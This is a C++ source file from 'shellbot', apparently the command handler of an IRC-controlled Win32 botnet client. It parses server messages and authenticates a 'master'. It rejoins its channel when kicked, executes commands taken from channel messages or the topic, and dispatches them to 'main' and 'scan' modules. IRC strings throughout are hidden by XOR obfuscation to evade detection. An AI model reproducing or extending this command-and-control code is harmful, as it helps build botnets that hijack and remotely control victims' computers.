/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vInclude.h"
#include "vPOEb.h"
#include "vCmdList.h"

void CCmd::GetSpeakerName(vector <string> iBuffer) {
	if (vPOEb->vMain.CheckUser(iBuffer[0])) {
		//! If master	is issueing commands in channel...
		if (iBuffer[2][0] == '#') vPOEb->vIRC.msgTo = iBuffer[2];
		//! If master is issueing commands in private message
		else vPOEb->vIRC.msgTo = iBuffer[0].substr(1, iBuffer[0].find("!")-1); 
	}
	else if (vPOEb->vMain.sTopic)
		vPOEb->vIRC.msgTo = vPOEb->vIRC.cConf.vChan;
}

void CCmd::InterpretCmd(vector <string> iBuffer)
{
	if (iBuffer[1].compare("001") == 0 || iBuffer[1].compare("005") == 0) {
		vPOEb->vIRC.bInitiated = true; vPOEb->vIRC.vReply = true;
		vPOEb->vIRC.SendData("%s %s\r\n",/*USERHOST*/XorStr<0x15,9,0x13D7ED89>("\x40\x45\x52\x4A\x51\x55\x48\x48"+0x13D7ED89).s,vPOEb->vIRC.cConf.vRealNick.c_str());
		vPOEb->vIRC.SendData("%s %s +i\r\n",/*MODE*/XorStr<0x31,5,0x75083E64>("\x7C\x7D\x77\x71"+0x75083E64).s,vPOEb->vIRC.cConf.vRealNick.c_str());
		vPOEb->vIRC.SendData("%s %s %s\r\n",/*JOIN*/XorStr<0x6A,5,0x3803010A>("\x20\x24\x25\x23"+0x3803010A).s,vPOEb->vIRC.cConf.vChan.c_str(),vPOEb->vIRC.cConf.vChanPass.c_str());
	} else if (iBuffer[1].compare("302") == 0) {
		int findA = iBuffer[3].find("@",0);
		vPOEb->vPOEscan.sExternalHost = iBuffer[3].substr(findA+1,iBuffer[3].length()-findA);
	}
	else if (iBuffer[1].compare("433") == 0) {
		vPOEb->vIRC.cConf.vRealNick = vPOEb->vIRC.RndNick(vPOEb->vIRC.cConf.vNick);
		vPOEb->vIRC.SendData("%s %s\r\n",/*NICK*/XorStr<0xFD,5,0x089E7DA4>("\xB3\xB7\xBC\x4B"+0x089E7DA4).s,vPOEb->vIRC.RndNick(vPOEb->vIRC.cConf.vNick).c_str());
	}
	else if (iBuffer[1].compare(/*KICK*/XorStr<0x68,5,0xF147D804>("\x23\x20\x29\x20"+0xF147D804).s) == 0) {
		if (iBuffer[3].compare(vPOEb->vIRC.cConf.vRealNick) == 0)
			vPOEb->vIRC.SendData("%s %s %s\r\n",/*JOIN*/XorStr<0x6A,5,0x3803010A>("\x20\x24\x25\x23"+0x3803010A).s,vPOEb->vIRC.cConf.vChan.c_str(),vPOEb->vIRC.cConf.vChanPass.c_str());
	}
	else if (iBuffer[0].compare(/*PING*/XorStr<0x8B,5,0x1D96D070>("\xDB\xC5\xC3\xC9"+0x1D96D070).s) == 0) {
		iBuffer[0].replace(1,1,"O");
		vPOEb->vIRC.SendData("%s %s\r\n",iBuffer[0].c_str(),iBuffer[1].c_str());
	}
	else if (iBuffer[1].compare(/*TOPIC*/XorStr<0x18,6,0xE5AD6903>("\x4C\x56\x4A\x52\x5F"+0xE5AD6903).s) == 0) {
		vPOEb->vMain.sTopic = true;
	} 
	else if (iBuffer[1].compare(/*PART*/XorStr<0xC8,5,0x9127B483>("\x98\x88\x98\x9F"+0x9127B483).s) == 0 && vPOEb->vMain.CheckUser(iBuffer[0])) {
		vPOEb->vMain.sLogin = false;
	}
		else if (iBuffer[1].compare("PONG") == 0) {
#ifdef DEBUG_MODE
		vPOEb->DebugPrint("debug",con::fg_gray,"Original PONG received...");
#endif // DEBUGMODE
		vPOEb->vIRC.vReply = true;
	}
	else if (iBuffer[1].compare(/*QUIT*/XorStr<0xCD,5,0xEA28F5DE>("\x9C\x9B\x86\x84"+0xEA28F5DE).s) == 0 && vPOEb->vMain.CheckUser(iBuffer[0])) {
		vPOEb->vMain.sLogin = false;
	}
	else if (iBuffer[1].compare("332") == 0) {
		vPOEb->vMain.sTopic = true;
		vPOEb->vMain.sOnJoinTopic = true;
		vPOEb->vMain.sTemp = iBuffer[0];		
		iBuffer.erase(iBuffer.begin());
	}
	if (iBuffer.size() > 3) {
		GetSpeakerName(iBuffer);
		if (iBuffer[3].compare(1,1,vPOEb->vIRC.cConf.vPrefix) == 0) {
			if ((iBuffer[3].compare(2,iBuffer[3].length()-1,bot_auth[0]) == 0 ||
				iBuffer[3].compare(2,iBuffer[3].length()-1,bot_auth[1]) == 0) 
				&& !vPOEb->vMain.sLogin && iBuffer.size() > 4) {
				vPOEb->vMain.Auth(iBuffer);
			}
			int pPosition = 0;		
			bool onlyOneCmd = false, mCounter = false, cmdMain, cmdScan;
			string s, cmd, cmdu, cmdl;
			if (vPOEb->vMain.sTopic && vPOEb->vMain.CheckUser(iBuffer[0]) || vPOEb->vMain.sLogin && vPOEb->vMain.CheckUser(iBuffer[0]) || vPOEb->vMain.sTopic && vPOEb->vMain.sOnJoinTopic) {
				
				for (std::vector<string>::iterator i = iBuffer.begin(); i != iBuffer.end(); i++) {
					s = (string)*i;	
					vPOEb->DebugPrint("debug",con::fg_blue,"%s",s.c_str());
					if (i == iBuffer.end()-1 && s != "|") onlyOneCmd = true;
					if (s == "|" || onlyOneCmd) {	
						if (!mCounter) 
							pPosition = 3;				
						else {
							pPosition += 1;
							iBuffer[pPosition].insert(0,":"); }
													
						cmd = iBuffer[pPosition];
#ifdef DEBUG_MODE
						vPOEb->DebugPrint("debug",con::fg_blue,"Prefix found (%s).", vPOEb->vIRC.cConf.vPrefix.c_str());
						vPOEb->DebugPrint("debug",con::fg_blue,"%s - %s : %d", iBuffer[pPosition].c_str(), cmd.c_str(), cmd.length());
#endif
						cmd = cmd.substr(2,cmd.length());
						int nPrefix = cmd.find_last_of(vPOEb->vIRC.cConf.vPrefix.c_str());
						if(nPrefix > 0) {
							cmdu = cmd.substr(0,nPrefix);
							cmdl = cmd.substr(nPrefix+1,cmd.length());
						}
#ifdef DEBUG_MODE
						vPOEb->DebugPrint("debug",con::fg_blue,"%s : %s", cmdu.c_str(), cmdl.c_str());
						vPOEb->DebugPrint("debug",con::fg_blue,"%s : %d", cmd.c_str(), nPrefix);
						vPOEb->DebugPrint("debug",con::fg_blue,"%s : %s", cmdu.c_str(), bot_main[0].c_str());
#endif
						cmdMain = (cmdu == bot_main[0] || cmdu == bot_main[1]);
						cmdScan = (cmdu == bot_scan[0] || cmdu == bot_scan[1]);
#ifdef DEBUG_MODE
						vPOEb->DebugPrint("debug",con::fg_blue,"%s : %s", (cmdMain)?"True":"False", (cmdScan)?"True":"False");
#endif
						if(cmdMain)vPOEb->vMain.ExecuteCmd(iBuffer, pPosition, cmdl);
						else if(cmdScan) vPOEb->vPCAPCmd.ExecuteCmd(iBuffer, pPosition, cmdl);

						mCounter = true;
						pPosition = distance(iBuffer.begin(), i); 
						onlyOneCmd = false;
					}	
				}
				if (vPOEb->vMain.sOnJoinTopic) {
					iBuffer.insert(iBuffer.begin(),vPOEb->vMain.sTemp);			
					vPOEb->vMain.sOnJoinTopic = false;
					vPOEb->vMain.sTopic = false; }	
			}
		}
	}
	iBuffer.clear();
	vPOEb->vMain.sTopic = false;
}